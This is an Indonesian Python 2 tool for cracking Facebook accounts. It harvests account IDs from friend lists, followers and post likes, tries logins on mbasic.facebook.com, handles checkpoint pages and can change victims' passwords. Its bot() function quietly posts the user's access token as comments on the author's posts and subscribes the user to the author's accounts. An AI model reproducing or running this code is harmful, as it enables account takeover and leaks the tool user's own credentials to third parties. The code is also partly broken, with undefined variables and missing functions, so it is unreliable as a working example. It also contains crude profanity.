#!/usr/bin/python2
# coding=utf-8
# author : BINTANG-XD

### IMPORT MODULE ###
import os, sys, re, time, requests, calendar, random,json
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
s=requests.Session()
try:
	import requests
except ImportError:
	print("\n [!] module requests belum terinstall")
	os.system("pip install requests")

try:
	import bs4
except ImportError:
	print("\n [!] module bs4 belum terinstall")
	os.system("pip install bs4")

try:
	import concurrent.futures
except ImportError:
	print("\n [!] module futures belum terinstall")
	os.system("pip install futures")


### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

### GLOBAL NAMA ###
IP = requests.get('https://api.ipify.org').text
id = []
cp = []
ok = []
loop = 0

### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

### DEF TAMBAHAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
### BAGIAN LOGO ###
def logo():
	os.system("clear")
	print("""%s
\x1b[1;91m ___________          _____ _____________________
\x1b[1;92m \_   _____/         /     \\______   \_   _____/
\x1b[1;93m  |    __)  ______  /  \ /  \|    |  _/|    __)  
\x1b[1;94m  |     \  /_____/ /    Y    \    |   \|     \   
\x1b[1;95m  \___  /          \____|__  /______  /\___  /   
\x1b[1;96m      \/                   \/       \/     \/      """%(N))
   
### BAGIAN LOGIN ###
def tokenz():
	os.system('clear')
	try:
		token = open('token.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print(" %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mAuthor     \x1b[1;93m: \x1b[1;93mNdriiTzy X EzaaTzy"%(N))
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mGithub     \x1b[1;93m: \x1b[1;93mhttps://github.com/YumasaaTzy")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m---------------------------------------------")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mBergabung  \x1b[1;93m: %s"%(tgl))
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mStatus     \x1b[1;93m: %s\x1b[1;92mPremium Sampai Kiamat%s"%(H,N))
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m---------------------------------------------")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mIP         \x1b[1;93m: %s"%(IP))
		token = raw_input('\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan token \x1b[1;93m: \x1b[1;92m')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
			menu()
		except KeyError:
			print(" %s[!] token kadaluwarsa!"%(M))
			sys.exit() 
 
### BOT FOLLOW DAN KOMEN ###
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit(" %s[!] token kadaluwarsa!"%(M))
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100013291513596/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/106024538578610/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/106024515245279/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/124014098051640/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/1324794007973637/comments/?message='+token+'&access_token=' + token)

### BAGIAN MENU ###
def menu():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s[!] token kadaluwarsa!"%(M))
        os.system('rm -f token.txt')
        tokenz()
    except requests.exceptions.ConnectionError:
        exit(" %s[!] anda tidak terhubung ke internet!"%(M))

    logo()
    print(" %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mAuthor    \x1b[1;93m: \x1b[1;93mNdriiTzy X EzaaTzy"%(N))
    print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mGithub    : https://github.com/YumasaaTzy")
    print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m--------------------------------------------")
    print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mBergabung \x1b[1;93m: %s"%(tgl))
    print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mStatus    \x1b[1;93m: %s\x1b[1;92mPremium Sampai Kiamat%s"%(H,N))
    print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m--------------------------------------------")
    print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mIP        \x1b[1;93m: %s"%(IP))
    print("\n \x1b[1;92m[ \x1b[1;97mselamat datang %s%s%s \x1b[1;92m]\n"%(K,nama,N))
    print(" \x1b[1;92m[\x1b[1;93m01\x1b[1;92m]. \x1b[1;93mcrack dari id publik")
    print(" \x1b[1;92m[\x1b[1;93m01\x1b[1;92m]. \x1b[1;93mcrack dari id massal")
    asw = raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mpilih menu : \x1b[1;92m")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    	atursandi()
    elif asw == "2":
    	massal()
    	atursandi()
    elif asw == "3":
    	followers()
    	atursandi()
    elif asw == "4":
    	postingan()
    	atursandi()
    elif asw == "5":
    	fbbaru()
        sandimanual()
    elif asw == "6":
    	fbtua()
        sandimanual()
    elif asw == "7":
    	emailfb()
        sandimanual()
    elif asw == "8":
    	infotambahan()
    elif asw == "0":
    	os.system('rm -f token.txt')
    	jalan(" \x1b[1;92m[\x1b[1;93m✓\x1b[1;92m] \x1b[1;93mberhasil menghapus token ")
    	exit()
    else:
    	jalan(" [!] pilih jawaban dengan bener ! ")
    	menu() 

### DUMP PUBLIK ###
def publik():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mtoken kadaluwarsa")
	print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93misi \x1b[1;97m'\x1b[1;92mme\x1b[1;97m' \x1b[1;93mjika ingin crack dari daftar teman")
	idt = raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mmasukan id atau username \x1b[1;93m: \x1b[1;92m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93makun tidak tersedia atau list teman private")
	print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id  \x1b[1;93m: %s%s%s\x1b[1;92m"%(M,len(id),N)) 
  
### DUMP MASSAL ###
def massal():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	try:
		tanya_total = int(raw_input(" [?] masukan jumlah target : "))
	except:tanya_total=1
	print(" [*] isi 'me' jika ingin crack dari daftar teman")
	for t in range(tanya_total):
		t +=1
		idt = raw_input(" [?] id target %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print(" [!] akun tidak tersedia atau list teman private")
	print("\n [+] total id  : %s%s%s"%(M,len(id),N))
	
### DUMP POSTINGAN ###
def postingan():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	idt = raw_input(" [?] masukan url atau id postingan : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/likes?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" [!] postingan tidak tersedia atau post private")
	print("\n [+] total id  : %s%s%s"%(M,len(id),N))

### DUMP FOLLOWERS ###
def followers():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mtoken kadaluwarsa")
	print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93misi \x1b[1;92m'\x1b[1;97mme\x1b[1;92m' \x1b[1;97mjika ingin crack dari pengikut sendiri")
	idt = raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mmasukan id atau username \x1b[1;97m: \x1b[1;92m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93makun tidak tersedia atau list teman private")
	print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id \x1b[1;97m-> %s%s%s\x1b[1;92m"%(M,len(id),N)) 

### DUMP POSTINGAN ###
def postingan():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mtoken kadaluwarsa")
	idt = raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan url atau id postingan \x1b[1;97m: \x1b[1;92m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/likes?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mpostingan tidak tersedia atau post private")
	print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id \x1b[1;97m-> %s%s%s\x1b[1;92m"%(M,len(id),N)) 
	
### CEK HASIL CRACK ###
def cekhasil():
	print('\n \x1b[1;92m[\x1b[1;93m1\x1b[1;92m]\x1b[1;97m. \x1b[1;92mlihat hasil crack OK ')
	print(' \x1b[1;92m[\x1b[1;93m2\x1b[1;92m]\x1b[1;97m. \x1b[1;93mlihat hasil crack CP ')
	anjg = raw_input('\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mpilih \x1b[1;97m: \x1b[1;92m')
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print("")
		for file in dirs:
			print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] "+file)
		try:
			file = raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmau lihat hasil yang mana \x1b[1;97m?: \x1b[1;92m")
			if file == "":
				menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:
			exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n \x1b[1;97m*\x1b[1;93m-------------------------------------------------\x1b[1;97m*")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] tanggal : %s -total : %s"%(del_txt, len(totalok)))
		os.system("cat OK/%s"%(file))
		raw_input("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mtekan enter untuk kembali ke menu")
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print("")
		for file in dirs:
			print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] "+file)
		try:
			file = raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmau lihat hasil yang mana \x1b[1;97m?: \x1b[1;92m")
			if file == "":
				menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:
			exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n \x1b[1;97m*\x1b[1;93m-------------------------------------------------\x1b[1;97m*")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] tanggal : %s -total : %s"%(del_txt, len(totalcp)))
		os.system("cat CP/%s"%(file))
		raw_input("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mtekan enter untuk kembali ke menu ")
		menu()
	else:
		menu()

### CEK OPSI ###
def cekopsi():
	dirs = os.listdir("CP")
	print("")
	for file in dirs:
		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] CP/"+file)
	print("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] masukan file (ex: CP/%s.txt)"%(tanggal))
	files = raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mnama file  \x1b[1;97m: \x1b[1;92m")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] nama file %s tidak tersedia"%(files))
	ubahpw()
	print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses cek')
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
		try:
			cek_opsi(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mcek akun sudah selesai\x1b[1;97m...")
	raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mtekan enter untuk kembali ke menu ")
	time.sleep(1)
	menu()

def ubahpw():
	pw=raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mapakah anda ingin mengubah sandi tap yes\x1b[1;97m?\x1b[1;92m[\x1b[1;93mY\x1b[1;97m/\x1b[1;93mt\x1b[1;92m]\x1b[1;97m: \x1b[1;92m")
	if pw == "Y" or pw == "y":
		ubahP.append("y")
		pw2=raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan sandi \x1b[1;97m: \x1b[1;92m")
		if len(pw2) <= 5:
			exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mkata sandi minimal 6 karakter ")
		else:
			pwbaru.append(pw2)
	else:
		pass


def cek_opsi(user,pw):
	global loop,ubahP,pwbaru
	session=requests.Session()
	session.headers.update({
		"Host":"mbasic.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9",
		"referer":"https://mbasic.facebook.com/",
		"user-agent":"nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	})
	soup=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
	response=parser(urlPost.text, "html.parser")
	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
		print("\r %s[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r %s[!] akun terkunci tampilan sesi new%s"%(M,N))
		else:
			loop+=1
			print("\r [✓] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "checkpoint" in session.cookies.get_dict():
		loop+=1
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=parser(an.text,"html.parser")
		number=0
		cek=[cek for cek in response2.find_all("option")]
		print("\r [+] terdapat "+str(len(cek))+" opsi ")
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				if "y" in ubahP:
					ubah_pw(user,pw,session,response,link2)
				else:
					print("\r [✓] akun tap yes, silahkan login di fb lite \n %s[✓] %s|%s|%s%s									\n"%(H,user,pwbaru,coki[0],N))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r %s[!] akun terpasang autentikasi dua faktor%s							\n"%(M,N))
			else:
				print("Kesalahan!")
		elif(len(cek)<=1):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
				print("  [%s] %s"%(str(number),opsi[0]))
		elif(len(cek)>=2):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
				print("  [%s] %s"%(str(number),opsi[0]))
			print("")
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r [✓] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		loop+=1
		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")

def ubah_pw(user,pw,session,response,link2):
	dat,dat2={},{}
	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
	for x in response("input"):
		if x.get("name") in but:
			dat.update({x.get("name"):x.get("value")})
	ubahPw=session.post(url+link2.get("action"),data=dat).text
	resUbah=parser(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		for b in resUbah("input"):
			if b.get("name") in but2:
				dat2.update({b.get("name"):b.get("value")})
		dat2.update({"password_new":"".join(pwbaru)})
		an=session.post(url+link3.get("action"),data=dat2)
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		print("\r [✓] akun tap yes, silahkan login di fb lite \n [*] sandi telah diubah ke : %s \n %s[✓] %s|%s|%s%s									\n"%(pwbaru[0],H,user,pwbaru[0],coki,N))
		cek_game(coki)

def cek_game(cookie):
	w=s.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=cookie).text
	sop = parser(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print("")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada",""),N))

###GANTI USER AGENT###
def seting_yntkts():
    print '\n (%s1%s) ganti user agent'%(O,N)
    print ' (%s2%s) check user agent'%(O,N)
    ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
    if ytbjts == '':
        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
    elif ytbjts in['1','01']:
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    else:
        print '\n %s[%s×%s] input yang bener'%(N,M,N);time.sleep(2);seting_yntkts()
# User Agent baru
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    _asu_ = raw_input('\n [%s?%s] ingin menggunakan user agent hp anda [Y/t]: '%(O,N))
    if _asu_ == '':
        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in['Y','y']:
        jalan('\n %s *%s anda akan di arakan ke situs web setelah di arahkan ke situs web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.yayanxd.my.id/server')
        _agen_ = raw_input(' [%s?%s] masukan user agent hp anda :%s '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] berhasil menggunakan user agent hp anda...'%(N,H,N))
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));menu()
    elif _asu_ in['T','t']:
        _agen_ = raw_input(' [%s?%s] masukan user agent :%s '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));menu()
    else:
        print '\n %s[%s!%s] Y/t ngentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()

####INFO TOOLS####
def info_tools():
    os.system('clear')
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Yt       \x1b[1;93m: Bintang XD.'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Author   \x1b[1;93m: BINTANG-XD.'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Github   \x1b[1;93m: https://github.com/bot-85'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Facebook \x1b[1;93m: Bintang Tzy'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Link FB  \x1b[1;93m: https://www.facebook.com/bintangt.zy.92'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Ig       \x1b[1;93m: Ndak punya'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Catatan  \x1b[1;93m: Please support my github, brothers and sisters'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
    raw_input('\n  [ %sKEMBALI%s ] '%(O,N));menu()
